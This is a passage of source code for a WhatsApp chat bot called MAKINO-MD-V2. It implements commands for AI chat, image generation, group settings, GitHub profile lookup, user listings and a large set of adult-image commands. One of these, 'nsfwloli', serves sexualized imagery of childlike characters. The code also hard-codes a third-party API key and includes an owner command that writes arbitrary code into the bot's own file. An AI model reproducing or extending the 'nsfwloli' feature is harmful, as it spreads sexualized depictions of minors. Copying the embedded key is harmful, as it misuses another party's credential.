              {
                text: "Anime Search",
                footer: '♱MAKINO-MD-V2♱♡⃤',
                title: OwnerName,
                buttonText: "Search Results",
                sections
              }, { quoted: m }
            )
          })
      }
        break;


      case 'chat':
      case 'gpt':
      {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!text) return reply(`Please provide a message to chat with the AI chatbot. Example: ${prefix}chat How are you?`);
          let d = await fetchJson(
            `https://bk9.fun/ai/gptt4?q=${text}`
          );
          if (!d.BK9) {
            return reply(
              "An error occurred while fetching the AI chatbot response. Please try again later."
            );
          } else {
            reply(d.BK9);
          }
        }
        break;



      case 'dalle': case 'imgai': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        const randomEmoji = manyemojis[Math.floor(Math.random() * manyemojis.length)];
        Taira.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
        if (!q) return reply(`Please provide a query to generate an image. Example: ${prefix + command} Beautiful landscape`);
        const apiUrl = `https://widipe.com/dalle?text=${encodeURIComponent(q)}`;
        try {
          await Taira.sendMessage(m.chat, { image: { url: apiUrl } }, { quoted: m });
        } catch (error) {
          console.error(error);
          reply("An error occurred while generating the image.");
        }
      }
        break;



      case 'settings':
      case 'groupsetting': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })

        let sections = []
        let com = [`group open`, `leveling on`, `antilinkgc on`, `antilinktg on`, `antilinktt on`, `antilinkytch on`, `antilinkytvid on`, `antilinkig on`, `antilinkfb on`, `antilinktwit on`, `antilinkall on`, `antiwame on`]
        let comm = [`group close`, `leveling off`, `antilinkgc off`, `antilinktg off`, `antilinktt off`, `antilinkytch off`, `antilinkytvid off`, `antilinkig on`, `antilinkfb off`, `antilinktwit off`, `antilinkall off`, `antiwame off`]
        let listnya = [`Group open/close`, `Leveling on/off`, `Antilink Group on/off`, `Antilink Telegram on/off`, `Antilink Tiktok on/off`, `Antilink Youtube Channel on/off`, `Antilink Youtube Video on/off`, `Antilink Instagram on/off`, `Antilink Facebook on/off`, `Antilink Twitter on/off`, `Antilink All on/off`, `Anti Wame on/off`]
        let suruh = [`Enable`, `Disable`]
        let fiturname = [`Group`, `Leveling`, `Auto Sticker`, `Antilink Group`, `Antilink Telegram`, `Antilink Tiktok`, `Antilink Youtube Channel`, `Antilink Youtube Video`, `Antilink Instagram`, `Antilink Facebook`, `Antilink Twitter`, `Antilink All`, `Anti Wame`, `Auto Revoke`]
        let startnum = 0; let startnu = 0; let startn = 0; let start = 0
        let startnumm = 1
        for (let x of com) {
          const yy = {
            title: `${listnya[startnum++]}`,
            rows: [
              {
                title: `${suruh[0]}`,
                description: `Activate ${fiturname[startnu++]}`,
                rowId: `${prefix}${x}`
              }, {
                title: `${suruh[1]}`,
                description: `Deactivate ${fiturname[startn++]}`,
                rowId: `${prefix}${comm[start++]}`
              }
            ]
          }
          sections.push(yy)
        }
        const sendm = Taira.sendMessage(
          from,
          {
            text: "Group Settings",
          }, { quoted: m }
        )
      }
        break;




	case 'emix': case 'emojimix': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })

        if (!q) reply(`*Example :* ${prefix + command} 😊+🌹`)
        let [emoji1, emoji2] = q.split`+`
        let kuntuh = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
        for (let res of kuntuh.results) {
          let encmedia = await Taira.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
          await fs.unlinkSync(encmedia)
        }
      }
        break;



      //-----------------------------------------------------------------------------------------------------------------------------------//

      //Nsfw
      case 'nsfw': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin);
        Taira.sendMessage(from, { react: { text: "⚠️", key: m.key } });

        if (args[0] === "on") {
          if (AntiNsfw) return reply('Already activated');
          ntnsfw.push(from);
          reply('Enabled NSFW Commands!');
        } else if (args[0] === "off") {
          if (!AntiNsfw) return reply('Already deactivated');
          let off = ntnsfw.indexOf(from);
          ntnsfw.splice(off, 1);
          reply('Disabled NSFW Commands!');
        } else {
          reply(`NSFW(not safe for work) feature has been enabled in this group, which means anyone here can accesss Adult commands!\n\nPlease use *'${prefix}nsfw on*' to enable NSFW commands or *'${prefix}nsfw off'* to disable them.`);
        }
      }
        break;

      case 'ahegao':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/agegao.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'ass':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'bdsm':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'blowjob':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'cuckold':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'cum':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'eba':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'ero':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'femdom':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'foot':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'gangbang':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      //
      case 'gifs':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        reply(mess.waiting)
        Taira.sendMessage(from, { react: { text: "👀", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
        const rand = nsfwdata[Math.floor(Math.random() * nsfwdata.length)]
        const response = await fetchBuffer(rand.url)
        //console.log(response)

        var fetchedgif = await GIFBufferToVideoBuffer(response)

        await Taira.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true }, { quoted: m }).catch(err => {
          console.log(err);
        })


      //
      case 'hentaivid': case 'hentaivideo': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        reply(mess.waiting)
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        anu = await hentai()
        result912 = anu[Math.floor(Math.random(), anu.length)]
        Taira.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `Title : ${result912.title}\nCategory : ${result912.category}\n$Mimetype : ${result912.type}\nViews : ${result912.views_count}\nShares : ${result912.share_count}\nSource : ${result912.link}\nMedia Url : ${result912.video_1}` }, { quoted: m })
      }
        break;


      case 'glasses':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'hentai':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'jahy':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'mangansfw':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'masturbation':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'milf':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'neko':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'neko2':
        if (isBan) return reply(mess.banned)
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw)
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'nsfwloli':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;

      case 'orgy':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);

        // React to the command message with a specific emoji
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } });

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'));
        var numberOfPictures = 3; // Change this value if you want to send a different number of pictures

        // Create a function to get multiple random pictures from the 'nsfwdata' array
        function getRandomPictures(array, count) {
          var shuffled = array.slice();
          var i = array.length;
          var min = i - count;
          var temp;
          var index;

          while (i-- > min) {
            index = Math.floor((i + 1) * Math.random());
            temp = shuffled[index];
            shuffled[index] = shuffled[i];
            shuffled[i] = temp;
          }

          return shuffled.slice(min);
        }

        // Get multiple random pictures from 'nsfwdata'
        var selectedPictures = getRandomPictures(nsfwdata, numberOfPictures);

        // Send the selected pictures one by one
        for (let picture of selectedPictures) {
          Taira.sendMessage(m.chat, { caption: mess.success, image: { url: picture.url } }, { quoted: m });
        }
        break;

      case 'panties':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);

        // React to the command message with a specific emoji
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } });

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'));
        var numberOfPictures = 3; // Change this value if you want to send a different number of pictures

        // Create a function to get multiple random pictures from the 'nsfwdata' array
        function getRandomPictures(array, count) {
          var shuffled = array.slice();
          var i = array.length;
          var min = i - count;
          var temp;
          var index;

          while (i-- > min) {
            index = Math.floor((i + 1) * Math.random());
            temp = shuffled[index];
            shuffled[index] = shuffled[i];
            shuffled[i] = temp;
          }

          return shuffled.slice(min);
        }

        // Get multiple random pictures from 'nsfwdata'
        var selectedPictures = getRandomPictures(nsfwdata, numberOfPictures);

        // Send the selected pictures one by one
        for (let picture of selectedPictures) {
          Taira.sendMessage(m.chat, { caption: mess.success, image: { url: picture.url } }, { quoted: m });
        }
        break;

      case 'pussy':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);

        // React to the command message with a specific emoji
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } });

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'));

        // Create an empty array to store the randomly selected pictures
        var selectedPictures = [];

        // The number of pictures you want to send (in this case, we'll send 3)
        var numberOfPictures = 3;

        // Loop to randomly select 'numberOfPictures' from 'nsfwdata'
        for (let i = 0; i < numberOfPictures; i++) {
          // Pick a random index from 'nsfwdata'
          var randomIndex = Math.floor(Math.random() * nsfwdata.length);
          var kairesult = nsfwdata[randomIndex];

          // Add the selected picture URL to the 'selectedPictures' array
          selectedPictures.push(kairesult.url);

          // Optionally, you can remove the selected picture from 'nsfwdata' to avoid duplication.
          // nsfwdata.splice(randomIndex, 1);
        }

        // Send the selected pictures one by one
        for (let url of selectedPictures) {
          Taira.sendMessage(m.chat, { caption: mess.success, image: { url: url } }, { quoted: m });
        }
        break;


      case 'tentacles':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      case 'thighs':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!AntiNsfw) return reply(mess.nonsfw);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } })

        var nsfwdata = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thighs.json'))
        var kairesult = pickRandom(nsfwdata)
        Taira.sendMessage(m.chat, { caption: mess.success, image: { url: kairesult.url } }, { quoted: m })
        break;


      //-----------------------------------------------------------------------------------------------------------------------------------//


      case 'getcase':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
	if(!isCreator) return reply(mess.botowner)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        const getCase = (cases) => {
          return "case" + `'${cases}'` + fs.readFileSync("MAKINO-MD-V2.js").toString().split('case \'' + cases + '\'')[1].split("break;")[0] + "break;"
        }
        reply(`${getCase(q)}`)
        break;


      case 'addcase': {

        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
	if (!isCreator) return reply(mess.botowner)
        if (args.length < 2) {
          return reply('Invalid usage! Please provide the case name and its functionality.');
        }
        const caseName = args[0];
        const functionality = args.slice(1).join(' ');
        fs.readFile('./MAKINO-MD-V2.js', 'utf8', (err, data) => {
          if (err) {
            console.error('Error reading MAKINO-MD-V2.js:', err);
            return reply('Failed to add case. Please try again later.');
          }
          const newCase = `
          case '${caseName}': {
            ${functionality}
          }
          break;
          `;
          const insertIndex = data.indexOf('switch (command) {') + 'switch (command) {'.length;
          const newData = data.slice(0, insertIndex) + newCase + data.slice(insertIndex);
          fs.writeFile('./MAKINO-MD-V2.js', newData, 'utf8', (err) => {
            if (err) {
              console.error('Error writing to MAKINO-MD-V2.js:', err);
              reply('Failed to add case. Please try again later.');
            } else {
              reply('New case added successfully!');
            }
          });
        });
      }
        break;


      case 'emoji': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        if (!args.join(" ")) return reply('Where is the emoji?')
        emoji.get(args.join(" ")).then(async (emoji) => {
          let mese = await Taira.sendMessage(m.chat, { image: { url: emoji.images[4].url }, caption: `Here it is...` }, { quoted: m })
          await Taira.sendMessage(from, { text: "reply -s to this image to make sticker" }, { quoted: mese })
        })
      }
        break;


      case 'deleteall': case 'delall': case 'delete': case 'del': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (isGroup && !isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        if (!m.quoted) return reply('Please mention a message baka!')
        let { chat, fromMe, id } = m.quoted
        const key = {
          remoteJid: m.chat,
          fromMe: false,
          id: m.quoted.id,
          participant: m.quoted.sender
        }
        await Taira.sendMessage(m.chat, { delete: key })
      }
        break;



      //-----------------------------------------------------------------------------------------------------------------------------------//



      case 'ghstalk': case 'githubstalk': case 'github': {
        Taira.sendMessage(from, { react: { text: "🔍", key: m.key } })
        if (!q) return reply(`Give me a user name like *${prefix}github anonphoenix007*`)
        gitdata = await githubstalk.githubstalk(`${q}`)
        Taira.sendMessage(m.chat, {
          image: { url: gitdata.profile_pic }, caption:
            `*ㅤㅤㅤ|ㅤㅤㅤGithub Info ㅤㅤㅤ|\*

  🚩 Id : ${gitdata.id}
  🔖 Nickname : ${gitdata.nickname}
  🔖 Username : ${gitdata.username}
  ✨ Bio : ${gitdata.bio}
  🏢 Company : ${gitdata.company}
  📍 Location : ${gitdata.location}
  📧 Email : ${gitdata.email}
  🔓 Public Repo : ${gitdata.public_repo}
  🔐 Public Gists : ${gitdata.public_gists}
  💕 Followers : ${gitdata.followers}
  👉 Following : ${gitdata.following}`
        }, { quoted: m })
      }
        break;

      
      case 'git':
      case 'gitclone':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "💫", key: m.key } });
        if (!args[0]) {
          return reply(`Please provide the GitHub repository link.\nExample:\n${prefix}${command} https://github.com/anonphoenix007/MAKINO-MD-V2`);
        }
        if (!isUrl(args[0]) || !args[0].includes('github.com')) {
          return reply(`Invalid or non-GitHub repository link provided. Please use a valid GitHub repository link.`);
        }
        try {
          let splitURL = args[0].split('github.com/');
          if (splitURL.length < 2) throw Error('Invalid GitHub URL');
          let [githubUser, githubRepo] = splitURL[1].split('/');
          githubRepo = githubRepo.replace('.git', '');
          let gitZipUrl = `https://api.github.com/repos/${githubUser}/${githubRepo}/zipball`;
          await Taira.sendMessage(from, { text: `Please wait, downloading...` });
          let zipHeaders = await fetch(gitZipUrl, { method: 'HEAD' }).then(res => res.headers);
          let zipFilename = zipHeaders.get('content-disposition').match(/attachment; filename=(.*)/)[1];
          await Taira.sendMessage(m.chat, { document: { url: gitZipUrl }, fileName: zipFilename + '.zip', mimetype: 'application/zip' }, { quoted: m });
        } catch (err) {
          console.error(err);
          return reply(`Failed to fetch the repository contents. Please ensure the GitHub link is correct and accessible. Use the format: 'https://github.com/username/repository'.`);
        }
        break;


      case 'listpc': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })

        let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v)
        let teks = ` 「  ♱MAKINO-MD-V2♱♡⃤ pm user list  」\n\nTotal ${anu.length} users are using ♱MAKINO-MD-V2♱♡⃤ in personal chat.`
        for (let i of anu) {
          teks += `\n\nProfile : @${i.id.split('@')[0]}\nChat : ${i.unreadCount}\nLastchat : ${moment(i.conversationTimestamp * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`
        }
        Taira.sendTextWithMentions(m.chat, teks, m)
      }
        break;


      case 'listgc': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })

        let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
        let teks = ` 「  group user list  」\n\nTotal ${anu.length} users are using bot in Groups.`
        for (let i of anu) {
          let metadata = await Taira.groupMetadata(i)
          if (metadata.owner === "undefined") {
            loldd = false
          } else {
            loldd = metadata.owner
          }
          teks += `\n\nName : ${metadata.subject ? metadata.subject : "undefined"}\nOwner : ${loldd ? '@' + loldd.split("@")[0] : "undefined"}\nID : ${metadata.id ? metadata.id : "undefined"}\nMade : ${metadata.creation ? moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss') : "undefined"}\nMember : ${metadata.participants.length ? metadata.participants.length : "undefined"}`
        }
        Taira.sendTextWithMentions(m.chat, teks, m)
      }
        break;


      case 'speedtest': case 'speedcheck': {
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })

        m.reply(`Wait,Testing Speed... ⚙️`)
        let cp = require('child_process')
        let { promisify } = require('util')
        let exec = promisify(cp.exec).bind(cp)
        let o
        try {
          o = await exec('python speed.py')
        } catch (e) {
          o = e
        } finally {
          let { stdout, stderr } = o
          if (stdout.trim()) m.reply(stdout)
          if (stderr.trim()) m.reply(stderr)
        }
      }
        break;


      case 'status': case 'post': {
        if (!isCreator) return reply(mess.owner)
        if (!quoted) return reply(`Send/reply Image With Caption ${prefix}status`)
        if (/video/.test(mime)) {
          if ((quoted.msg || quoted).seconds > 30) return reply('Maximum 30 seconds video is allowed!')
        }
        const messageType = Object.keys(m.message)[0]
        if (messageType === 'imageMessage') {
          const media = await downloadMediaMessage(m, 'media', {}, { logger, reuploadRequest: sock.updateMediaMessage })
          await writeFile('./image.jpeg', media)
          await Taira.sendMessage(botNumber, 'status@broadcast', { url: './image.jpeg', media }).catch((err) => fs.unlinkSync(media))
          reply(`*✨ ${pushname}...!! Posted On My Status ✨*`);
        }
        else if (messageType === 'videoMessage') {
          const media = await downloadMediaMessage(m, 'media', {}, { logger, reuploadRequest: sock.updateMediaMessage })
          await writeFile('./video.mp4', media)
          await Taira.sendMessage(botNumber, 'status@broadcast', { url: 'video.mp4', media }).catch((err) => fs.unlinkSync(media))
          reply(`*✨ ${pushname}...!! Posted On My Status ✨*`);
        }
        else {
          reply(`an error occurred`)
        }

      }
        break;



      //-----------------------------------------------------------------------------------------------------------------------------------//


      case 'afk': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        let user = global.db.users[m.sender]
        user.afkTime = + new Date
        user.afkReason = args.join(" ")
        reply(`${m.pushName} is now Away From Keyboard.\nAFK Reason : ${args.join(" ") ? args.join(" ") : ''}`)
      }
        break;


      case 'fliptext': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (args.length < 1) return reply(`Example:\n${prefix}fliptext ${OwnerName}`)
        quere = args.join(" ")
        flipe = quere.split('').reverse().join('')
        reply(`\`\`\`「  Text Flipper Tool  」\`\`\`\n*Input text :*\n${quere}\n*Fliped text :*\n${flipe}`)
      }
        break;


      case 'toletter': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!Number(args[0])) return reply(`Example:\n${prefix}toletter 956`)
        try {
          quere = args.join(" ")
          convertes = await toHur(quere)
          reply(`\`\`\`「  Word Maker Tool  」\`\`\`\n*Input Number :*\n${quere}\n*Converted Alphabet :*\n${convertes}`)
        } catch {
          reply(`Error!`)
        }
      }


      //-----------------------------------------------------------------------------------------------------------------------------------//


      //
      case 'antilinkgc': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        if (args[0] === "on") {
          if (AntiLink) return reply('Already activated')
          ntilink.push(from)
          reply('Activated _Antilink_ in this group.')
          var groupe = await Taira.groupMetadata(from)
          var members = groupe['participants']
